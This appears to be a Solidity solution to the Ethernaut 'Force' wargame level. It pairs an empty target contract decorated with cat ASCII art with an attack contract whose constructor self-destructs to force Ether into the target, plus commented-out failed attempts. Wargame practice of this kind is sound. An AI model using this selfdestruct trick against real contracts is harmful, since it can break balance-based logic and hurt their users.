// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force { /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */ 
}

contract ForceHack {
    // // Function to send Ether to the Force contract
    // function forceSend(address payable _forceContract) external {
    //     require(address(this).balance > 0, "No Ether to send");

    //     // Attempt to send Ether using a regular transfer
    //     (bool success, ) = _forceContract.call{value: address(this).balance}("");
    //     require(success, "Failed to send Ether");
    // }

    // // Function to check the balance of this contract
    // function getBalance() public view returns (uint) {
    //     return address(this).balance;
    // }

    // receive() external payable { 
    //     require(msg.value > 0, "Must send Ether");
    // }

    // fallback() external payable {
    //     require(msg.value > 0, "Must send Ether");
    //  }
    constructor(address payable _target) payable {
        selfdestruct(_target);
    }
}
